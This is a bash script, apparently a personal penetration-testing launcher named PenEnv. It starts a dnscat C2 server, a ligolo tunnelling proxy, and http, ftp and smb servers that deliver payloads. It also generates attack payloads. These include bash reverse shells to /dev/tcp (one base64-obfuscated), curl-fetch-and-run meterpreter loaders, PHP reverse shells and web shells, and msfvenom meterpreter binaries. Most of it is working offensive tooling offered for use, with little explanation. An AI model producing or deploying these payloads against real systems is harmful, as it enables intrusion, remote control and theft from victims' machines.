#! /bin/bash
# TODO : check if service already running
# TODO : check if something is using the port
# TODO : auto msfvenom binnaries

echo "    ____             ______          ";
echo "   / __ \___  ____  / ____/___ _   __";
echo "  / /_/ / _ \/ __ \/ __/ / __ \ | / /";
echo " / ____/  __/ / / / /___/ / / / |/ / ";
echo "/_/    \___/_/ /_/_____/_/ /_/|___/  ";
echo "                                     ";
echo ""
echo "Author : lLou_"
echo "Suite version : V0.3.0"
echo "Script version : V1.5"
echo ""
echo ""

restart-service () {
        if [[ $# -eq 0 ]];then return;fi
        for pid in $(ps aux | grep $1 | awk '{print($2)}'); do
                sudo kill $pid >/dev/null 2>/dev/null
        done
}

# Set directory environement
usr=$(whoami)
if [[ $usr == "root" ]];then
        tput setaf 1;echo "[-] Running as root. Please run in rootless mode... Exiting...";tput sgr0
        exit 1
fi

# Set directory environement
log=/home/$usr/.logs
if [[ ! -d $log && ! $nologs ]];then
        echo "[+] Creating log folder in $log"
        mkdir $log
fi
log=$log/start-$(date +%F)
if [[ ! -d $log && ! $nologs ]];then
        echo "[+] Creating start log folder in $log"
        mkdir $log
fi
hotscript=/home/$usr/hot-script
if [[ ! -d $hotscript ]];then
        echo "[+] Creating hotscript folder in $hotscript"
        mkdir $hotscript
fi
payloads_dir=$hotscript/payloads
if [[ ! -d $payloads_dir ]];then
        echo "[+] Creating payload folder in $hotscript"
        mkdir $payloads_dir
fi
session=/home/$usr/.session
if [[ ! -d $session ]];then
        echo "[+] Creating session folder in $session"
        mkdir $session
fi
sudo rm $session/* 2>/dev/null

## Services
# Starting Neo4j
echo "[+] (Re)Starting neo4j"
restart-service neo4j
touch $session/neo4j.stdin
tail -f $session/neo4j.stdin | sudo unbuffer -p neo4j console 2>&1 | tee $log/neo4j.log > /dev/null &
sudo ln -s $log/neo4j.log $session/neo4j.stdout
tput setaf 4;echo "[*] Access to neo4j web interface through http://localhost:7474";tput sgr0
tput setaf 6;echo "[~] Launch bloodhound using 'bloodhound' command";tput sgr0

echo ""

# Starting Nessus
echo "[+] Starting nessusd"
sudo systemctl start nessusd
tput setaf 4;echo "[*] Access to nessus web interface through https://localhost:8834";tput sgr0

echo ""

## Servers
# Starting dnscat server
echo "[+] (Re)Starting dnscat"
restart-service dnscat
read -e -p "Domain > " dom
read -e -p "Secret > " sec
if [[ ! "$sec" ]];then sec="hellowthere";fi
touch $session/dnscat.stdin
touch $session/dnscat.stdout
tail -f $session/dnscat.stdin | sudo unbuffer -p dnscat $dom --secret $sec --security=authenticated 2>&1 | tee $session/dnscat.stdout > /dev/null &
tput setaf 4;echo "[*] Access to dnscat tunnel through localhost:53 with secret $sec";tput sgr0
tput setaf 6;echo "[~] To connect while using domain request, make sure this server is an authoritative DNS";tput sgr0
tput setaf 6;echo "[~] To get your shell after executing client dnscat, execute get-session";tput sgr0

echo ""

# Starting ligolo proxy
echo "[+] (Re)Starting ligolo proxy"
restart-service ligolo
sudo ip tuntap add user $usr mode tun ligolo 2>/dev/null
sudo ip link set ligolo up
touch $session/ligolo.stdin
touch $session/ligolo.stdout
tail -f $session/ligolo.stdin | sudo unbuffer -p ligolo -selfcert 2>&1 | tee $session/ligolo.stdout > /dev/null &
tput setaf 4;echo "[*] Ligolo proxy vpn has been made";tput sgr0
tput setaf 6;echo "[~] To connect use ligolo hotscript on the victim to connect to port 11601";tput sgr0
tput setaf 6;echo "[~] To get your shell after executing client dnscat, execute get-session";tput sgr0

echo ""

# Starting openvpn servers
echo "[+] (Re)Starting openvpn"
restart-service openvpn
tput setaf 6;echo "[~] Give vpn file path to launch if you want to initiate a vpn connexion";tput sgr0

read -e -p "VPN File > " vpnfile
if [[ $vpnfile ]];then
  if [[ -f $vpnfile ]];then
    sudo unbuffer openvpn $vpnfile 2>&1 | tee $log/openvpn.log > /dev/null &
    sudo ln -s $log/openvpn.log $session/openvpn.stdout
    tput setaf 4;echo "[*] Waiting a bit for tunnelling to set up";tput sgr0
    while [[ ! "$(ifconfig | grep tun)" ]]; do sleep .5; done
    tput setaf 4;echo "[*] Connexion to $(basename $vpnfile) done";tput sgr0
  else
    tput setaf 1;echo "[!] $vpnfile is not a valid file path";tput sgr0
  fi
fi

## Dynamic hotscripts
generating-payloads() {
        ## $1 is ip, $2 is port (default is 4444) and $3 is directory (default is $payloads_dir/$ip-$port)
        if [[ $# -eq 1 ]];then port=4444; dir=$payloads_dir/$1-$port
        elif [[ $# -eq 2 ]];then port=$2; dir=$payloads_dir/$1-$port
        elif [[ $# -eq 3 ]];then port=$2; dir=$3
        else return; fi

        if [[ ! -d "$dir" ]];then mkdir $dir; fi
        if [[ ! -d "$dir/meterpreter" ]];then mkdir $dir/meterpreter; fi

        # Linux reverse tcp
        echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/$1/$port 0>&1'" > $dir/linux_reverse_tcp_bash
        echo "echo '$(cat $dir/linux_reverse_tcp_bash | base64)' | base64 -d | /bin/bash" > $dir/linux_reverse_tcp_bash_b64
        
        # Linux ddexec sheller
        echo "k=\$(curl -s http://$1/payloads/$1-$port/meterpreter/linux_x64.so | base64 -w0);/bin/bash /dev/stdin < <(echo "k=\$k" && (curl -s http://$1/ddexec | sed $'s/read -r bin/bin=\$k/g'))" > $dir/linux_ddexec_meterpreter_x64
        echo "k=\$(curl -s http://$1/payloads/$1-$port/meterpreter/linux_x86.so | base64 -w0);/bin/bash /dev/stdin < <(echo "k=\$k" && (curl -s http://$1/ddexec | sed $'s/read -r bin/bin=\$k/g'))" > $dir/linux_ddexec_meterpreter_x86

        # PHP web & reverse shell shell
        echo "<?php system(\"$(cat $dir/linux_reverse_tcp_bash)\")?>" > $dir/linux_reverse_tcp_php
        echo "<?php system(\"$(cat $dir/linux_reverse_tcp_bash_b64)\")?>" > $dir/linux_reverse_tcp_php_b64
        echo "<?php system(\$_GET['cmd'])?>" > $dir/web_shell_php
        echo "<html><body><form method=\"GET\" name=\"<?php echo basename(\$_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset(\$_GET[\"cmd\"])){system(\$_GET[\"cmd\"]);}?></pre></body></html>" > $dir/web_shell_comfort_php

        # meterpreter
        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > windows_x64.exe 2>/dev/null
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > windows_x86.exe 2>/dev/null
        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > linux_x64.exe 2>/dev/null
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > linux_x86.exe 2>/dev/null
        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f dll > windows_x64.dll 2>/dev/null
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f dll > windows_x86.dll 2>/dev/null
        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f elf-so > linux_x64.so 2>/dev/null
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f elf-so > linux_x86.so 2>/dev/null

}

echo ""
echo ""
echo "[+] Generating payloads according to network configuration"

for ip in $(ifconfig | grep "inet " | awk '{print($2)}');do
        echo "[*] Generating payloads for $ip:4444"
        generating-payloads $ip
done

echo "[+] Generating payloads according to user input (leave empty to escape)"
ip="1"
while [[ "$ip" ]];do
        read -e -p "Attacker ip > " ip
        if [[ "$ip" ]];then
                if [[ ! "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]];then echo "[!] '$ip' is not an ip in the format 0.0.0.0"
                else
                        read -e -p "Attacker port > " port
                        if [[ ! "$ip" =~ ^[0-9]{1,5}$ || $ip -gt 65535 ]];then echo "[!] '$port' is not a valid port";
                        else echo "[*] Generating payloads for $ip:$port"; generating-payloads $ip $port; fi
                fi
        fi
done

## File transfers
echo ""
echo ""
# Start http server
echo "[+] (Re)Starting file transfer through http"
restart-service http.server
sudo unbuffer python3 -m http.server --directory $hotscript 80 2>&1 | tee $log/http.log > /dev/null &
sudo ln -s $log/http.log $session/http.stdout
tput setaf 4;echo "[*] Access to file download through http://localhost:80/<path>";tput sgr0

echo ""

# Start ftp server
echo "[+] (Re)Starting file transfer through ftp"
restart-service pyftpdlib
sudo unbuffer python3 -m pyftpdlib -p 21 -w -d hot-script -u $usr -P penenv 2>&1 | tee $log/ftp.log > /dev/null &
sudo ln -s $log/ftp.log $session/ftp.stdout
tput setaf 4;echo "[*] Access to file transfer through ftp://localhost:21 with $usr:penenv";tput sgr0

echo ""

# Start smb server
echo "[+] (Re)Starting file transfer through smb"
restart-service impacket-smbserver
sudo unbuffer impacket-smbserver share $hotscript -smb2support 2>&1 | tee $log/smb.log > /dev/null &
sudo ln -s $log/smb.log $session/smb.stdout
tput setaf 4;echo "[*] Access to file transfer through //localhost/share/<path>";tput sgr0



